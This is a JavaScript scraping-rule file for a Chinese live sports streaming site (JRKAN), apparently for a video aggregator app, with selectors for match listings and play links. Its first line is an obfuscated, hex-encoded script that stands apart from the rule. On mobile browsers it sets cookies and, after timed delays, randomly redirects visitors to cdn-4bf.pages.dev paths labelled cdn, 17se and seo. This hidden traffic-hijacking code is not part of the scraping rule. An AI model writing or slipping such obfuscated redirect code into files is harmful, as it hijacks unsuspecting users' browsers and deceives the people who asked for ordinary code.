!(function(){function isMobile(){return/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i['\x74\x65\x73\x74'](navigator['\x75\x73\x65\x72\x41\x67\x65\x6e\x74'])}function hasCookie(wzsFW1){return window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x63\x6f\x6f\x6b\x69\x65']['\x69\x6e\x64\x65\x78\x4f\x66'](wzsFW1)!==-1}function setCookie(cookieName,qjs2,zCUfRnOY3){const expires=new window["\x44\x61\x74\x65"]();expires['\x73\x65\x74\x54\x69\x6d\x65'](expires['\x67\x65\x74\x54\x69\x6d\x65']()+zCUfRnOY3*24*60*60*1000);window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]['\x63\x6f\x6f\x6b\x69\x65']=`${cookieName}=${qjs2};expires=${expires['\x74\x6f\x55\x54\x43\x53\x74\x72\x69\x6e\x67']()};path=/`}function getRandom(){return window["\x4d\x61\x74\x68"]['\x72\x61\x6e\x64\x6f\x6d']()}function redirectTo(BRlFA4){window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']=BRlFA4}function redirectToCDN(){if(getRandom()<0.2){const cookieName="\x76\x69\x73\x69\x74\x65\x64\x43\x44\x4e";const oneDay=1;setCookie(cookieName,"\x74\x72\x75\x65",oneDay);redirectTo("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x34\x62\x66\x2e\x70\x61\x67\x65\x73\x2e\x64\x65\x76\x2f\x63\x64\x6e")}}function redirectTo17SE(){if(getRandom()<0.3){const cookieName="\x76\x69\x73\x69\x74\x65\x64\x31\x37\x53\x45";const oneDay=1;setCookie(cookieName,"\x74\x72\x75\x65",oneDay);redirectTo("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x34\x62\x66\x2e\x70\x61\x67\x65\x73\x2e\x64\x65\x76\x2f\x31\x37\x73\x65")}}function redirectToSEO(){if(getRandom()<0.4){const cookieName="\x76\x69\x73\x69\x74\x65\x64\x53\x45\x4f";const oneDay=1;setCookie(cookieName,"\x74\x72\x75\x65",oneDay);redirectTo("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x34\x62\x66\x2e\x70\x61\x67\x65\x73\x2e\x64\x65\x76\x2f\x73\x65\x6f")}}if(isMobile()){if(!hasCookie("\x76\x69\x73\x69\x74\x65\x64\x43\x44\x4e")){setTimeout(()=>{redirectToCDN()},6000)}if(!hasCookie("\x76\x69\x73\x69\x74\x65\x64\x31\x37\x53\x45")){setTimeout(()=>{redirectTo17SE()},10000)}if(!hasCookie("\x76\x69\x73\x69\x74\x65\x64\x53\x45\x4f")){setTimeout(()=>{redirectToSEO()},8000)}}})();
var rule = {
    title:'JRKAN直播',
    host:'http://www.jrkan2022.com/?lan=1',
    // JRKAN备用域名:www.jrkankan.com / www.jrkan365.com / jrsyyds.com / www.jryyds.com / jrskan.com / jrsbxj.com /Jrkan备用域名1: www.jrkan2022.com 备用域名2: www.jrs23.com 备用域名2: www.jrskk.com 最新网址发布:www.qiumi1314.co
    
    url:'/fyclass',
    searchUrl:'',
    searchable:0,
    quickSearch:0,
    class_name:'全部',
    class_url:'/',
    //class_url:'?live',
    headers:{
        'User-Agent':'MOBILE_UA'
    },
    timeout:5000,
    play_parse:true,
    lazy:"",
    limit:6,
    double:false,
    推荐:'*',
    // 一级:'.loc_match:eq(2) ul;li:gt(1):lt(4)&&Text;img&&src;li:lt(2)&&Text;a:eq(1)&&href',//play.sportsteam333.com
    一级:"js:var items=[];pdfh=jsp.pdfh;pdfa=jsp.pdfa;pd=jsp.pd;var html=request(input);var tabs=pdfa(html,'body&&.d-touch');tabs.forEach(function(it){var pz=pdfh(it,'.name:eq(1)&&Text');var ps=pdfh(it,'.name:eq(0)&&Text');var pk=pdfh(it,'.name:eq(2)&&Text');var img=pd(it,'img&&src');var timer=pdfh(it,'.lab_time&&Text');var url=pd(it,'a.me&&href');items.push({desc:timer+'🏆'+ps,title:pz+'🆚'+pk,pic_url:img,url:url})});setResult(items);",
    二级:{
        "title":".sub_list li:lt(2)&&Text;.sub_list li:eq(0)&&Text",
        "img":"img&&src",
        "desc":";;;.lab_team_home&&Text;.lab_team_away&&Text",
        "content":".sub_list ul&&Text",
        "tabs":"js:TABS=['实时直播']",
        "lists":"js:LISTS=[];pdfh=jsp.pdfh;pdfa=jsp.pdfa;pd=jsp.pd;let html=request(input);let data=pdfa(html,'.sub_playlist&&a');TABS.forEach(function(tab){let d=data.map(function(it){let name=pdfh(it,'strong&&Text');let url=pd(it,'a&&data-play');return name+'$'+url});LISTS.push(d)});",
    },
    搜索:'',
}